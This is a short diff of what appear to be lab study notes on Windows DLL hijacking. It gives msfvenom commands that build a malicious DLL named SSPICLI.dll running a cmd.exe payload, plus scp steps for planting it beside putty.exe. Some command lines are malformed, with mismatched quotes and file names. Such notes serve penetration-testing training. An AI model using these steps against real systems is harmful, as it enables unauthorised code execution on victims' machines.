@@ -187,14 +187,15 @@ path contains .dll
 result contains NAME NOT FOUND
 the run <.exe>
 
-msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\<user>\Desktop\whoami.exe' -f dll > SSPICLI.dll
-
-Windows command prompt:
-scp student@linuxip:/home/student/SSPICLI.dll .
-scp student@linuxip:/home/student/putty.exe .
-make old putty, and place the new one in the same folder, view whoami.txt
-
-
+Making a DLL
+      Windows command prompt:
+      msfvenom -p windows/exec CMD='cmd.exe /C "command > C:\Fileisgoingforwritabledirectory' -f dll > nameofcalledupon.dll
+      scp student@linuxip:/home/student/SSPICLI.dll .
+      scp student@linuxip:/home/student/putty.exe .
+      make old putty, and place the new one in the same folder, view whoami.txt
+      msfvenom -p windows/exec CMD='cmd.exe /C "command C:\Filepath > C:\Fileisgoingforwritabledirectory' -f dll > nameofcalledupon.dll
+      
+      
 
 
 Regedit
